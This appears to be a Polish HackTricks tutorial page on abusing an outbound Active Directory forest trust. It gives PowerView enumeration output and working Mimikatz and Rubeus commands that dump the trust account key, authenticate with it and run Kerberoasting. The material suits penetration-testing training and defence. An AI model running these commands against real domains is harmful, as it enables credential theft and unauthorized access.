# Zewnętrzna domena lasu - jednokierunkowa (wychodząca)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

W tym scenariuszu **twoja domena** ufa pewnym **uprawnieniom** dla podmiotu z **innych domen**.

## Wyliczanie

### Zaufanie wychodzące
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Atak na konto zaufania

Istnieje podatność na bezpieczeństwo, gdy zostanie ustanowione zaufanie między dwoma domenami, tutaj określanymi jako domena **A** i domena **B**, gdzie domena **B** rozszerza swoje zaufanie do domeny **A**. W tej konfiguracji tworzone jest specjalne konto w domenie **A** dla domeny **B**, które odgrywa kluczową rolę w procesie uwierzytelniania między dwiema domenami. To konto, powiązane z domeną **B**, jest wykorzystywane do szyfrowania biletów dostępu do usług między domenami.

Kluczowym aspektem do zrozumienia jest to, że hasło i skrót tego specjalnego konta można wyodrębnić z kontrolera domeny w domenie **A** za pomocą narzędzia wiersza poleceń. Polecenie do wykonania tej czynności to:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Ta ekstrakcja jest możliwa, ponieważ konto, zidentyfikowane za pomocą znaku **$** po nazwie, jest aktywne i należy do grupy "Domain Users" w domenie **A**, co oznacza dziedziczenie uprawnień związanych z tą grupą. Pozwala to osobom uwierzytelniać się w domenie **A** za pomocą poświadczeń tego konta.

**Ostrzeżenie:** Możliwe jest wykorzystanie tej sytuacji do zdobycia punktu zaczepienia w domenie **A** jako użytkownik, choć z ograniczonymi uprawnieniami. Jednak ten dostęp wystarcza do przeprowadzenia enumeracji w domenie **A**.

W scenariuszu, w którym `ext.local` jest domeną ufającą, a `root.local` jest domeną zaufaną, zostanie utworzone konto użytkownika o nazwie `EXT$` w `root.local`. Za pomocą odpowiednich narzędzi możliwe jest wydobywanie kluczy zaufania Kerberos, ujawniających poświadczenia `EXT$` w `root.local`. Polecenie do osiągnięcia tego celu to:
```bash
lsadump::trust /patch
```
Następnie można użyć wyodrębnionego klucza RC4 do uwierzytelnienia jako `root.local\EXT$` w `root.local` za pomocą innego polecenia narzędzia:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Ten krok uwierzytelniania otwiera możliwość wyliczenia i nawet wykorzystania usług w `root.local`, takich jak atak Kerberoast w celu wydobycia poświadczeń konta usługi przy użyciu:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Pozyskiwanie hasła zaufania w postaci tekstu jawnego

W poprzednim etapie użyto hasha zaufania zamiast **hasła w postaci tekstu jawnego** (które również zostało **wydobyte za pomocą mimikatz**).

Hasło w postaci tekstu jawnego można uzyskać, konwertując wynik \[ CLEAR ] z mimikatz z postaci szesnastkowej i usuwając bajty zerowe '\x00':

![](<../../.gitbook/assets/image (2) (1) (2) (1).png>)

Czasami podczas tworzenia relacji zaufania, użytkownik musi wpisać hasło zaufania. W tej demonstracji klucz to oryginalne hasło zaufania, które jest czytelne dla człowieka. Ponieważ klucz cykluje (co 30 dni), hasło w postaci tekstu jawnego nie będzie czytelne dla człowieka, ale nadal technicznie użyteczne.

Hasło w postaci tekstu jawnego można użyć do wykonywania regularnej autoryzacji jako konto zaufania, jako alternatywa dla żądania TGT przy użyciu tajnego klucza Kerberos konta zaufania. Tutaj, zapytanie root.local z ext.local dla członków Domain Admins:

![](<../../.gitbook/assets/image (1) (1) (1) (2).png>)

## Referencje

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
